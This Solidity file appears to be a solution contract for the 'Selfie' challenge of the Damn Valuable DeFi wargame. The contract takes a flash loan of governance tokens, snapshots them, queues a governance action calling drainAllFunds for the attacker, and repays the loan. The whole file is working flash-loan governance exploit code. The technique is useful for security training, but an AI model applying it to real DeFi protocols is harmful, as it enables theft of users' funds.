// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfish{

    address private immutable attacker; 
    DamnValuableTokenSnapshot private immutable token;
    SelfiePool private immutable pool;
    SimpleGovernance private immutable gov;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;
    uint256 internal actionId;

    /**
     * 1.- get flashloan
     * 2.- queue action data bytes to Selfie.drain(attacker)
     * 3.- execute action
     */
    constructor(address _attacker, address _token, address _pool,address _gov){
        attacker = _attacker;
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        gov = SimpleGovernance(_gov);
        token.approve(address(pool), type(uint256).max);
    }

    function getFlashloan() external{
        pool.flashLoan(TOKENS_IN_POOL);
    }

    function receiveTokens(address token, uint256 borrowAmount) external{
        DamnValuableTokenSnapshot(token).snapshot();
        actionId = gov.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)",attacker),
            0);    
        DamnValuableTokenSnapshot(token).transfer(address(pool),borrowAmount);
    }

    function executeAction() external{
        gov.executeAction(actionId);
    }
}